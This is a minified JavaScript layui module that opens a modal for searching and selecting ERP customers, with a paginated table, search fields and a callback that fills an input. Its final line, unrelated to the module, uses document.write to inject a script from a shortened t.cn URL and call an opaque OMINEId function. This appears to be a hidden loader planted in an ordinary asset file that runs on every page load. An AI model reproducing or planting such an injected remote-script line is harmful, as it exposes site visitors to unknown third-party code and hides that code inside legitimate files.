"use strict";layui.define(["layer","table","form","laypage"],function(e){var n,o=layui.layer,t=layui.table,a=layui.form,l=layui.laypage,i=function(e,t){$.get("/Admin/Customer/erpCustomerList",e,function(e){0===(e=$.parseJSON(e)).error?(n=e.data,t(e.data)):o.tips(e.msg,".modal-search-btn")})},s=function(e){t.render({elem:".select-modal-table",data:e.list,page:!1,limit:e.pageSize,cellMinWidth:160,height:"320",cols:[[{field:"checkbox",width:50,fixed:"left",templet:'<div><input class="select-modal-checkbox" lay-filter="c_check" type="checkbox" name="" lay-skin="primary"></div>'},{field:"id",title:"id",width:80},{field:"fcustno",title:"客户编号",width:160},{field:"fcustname",title:"客户名称",width:160},{field:"fcustjc",title:"客户简称",width:160},{field:"create_time",title:"创建时间",width:160}]]}),a.on("checkbox(c_check)",function(e){$(".select-modal-checkbox").prop("checked",!1),$(e.elem).prop("checked",!0),a.render("checkbox")})},r=function(a){l.render({elem:$(".layui-layer-content").find(".select-modal-page")[0],limit:a.pageSize,count:a.count,curr:a.page,layout:["prev","page","next"],jump:function(e,t){t||i({page:e.curr,pageSize:a.pageSize},function(e){s(e)})}})};e("selectErpCustomer",{start:function(c){o.open({title:"选择erp客户",type:0,area:["640px","540px"],content:'<div class="select-modal-container"> <div class="select-modal-box"> <div class="select-search-container"><input class="layui-input modal-search-input" name="fcustno" type="text" placeholder="输入客户编号检索"><input class="layui-input modal-search-input" name="fcustname" type="text" placeholder="输入客户名称检索"><div class="layui-btn-group"> <button class="layui-btn modal-search-btn">搜索</button> <button class="layui-btn layui-btn-primary modal-clear-btn">清空</button> </div></div><table lay-filter="select-modal-table" class="select-modal-table"></table> <div class="select-modal-page"></div> </div> </div>',success:function(){$(".modal-search-btn").click(function(){var e={},t=$('.modal-search-input[name="fcustname"]').val().trim(),a=$('.modal-search-input[name="fcustno"]').val().trim();t&&(e.fcustname=t),a&&(e.fcustno=a),i(e,function(e){s(e),r(e)})}),$(".modal-clear-btn").on("click",function(){$(".modal-search-input").val(""),i({},function(e){s(e),r(e)})}),i({},function(e){s(e),r(e)})},yes:function(e,t){var a=$(".layui-layer-content .select-modal-checkbox:checked");if(a.length){var l=a.parent().parent().parent().index(),i=n.list[l];c(i),o.close(e)}else o.tips("请勾选需要操作的数据",".layui-layer-btn0")}})},initInput:function(e,a){var l=this;e=e||".jl-select-erp-customer",$(e).click(function(){var t=$(this);l.start(function(e){t.val(e.user_name),t.data("id",e.id),a&&a(e)})})}})});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
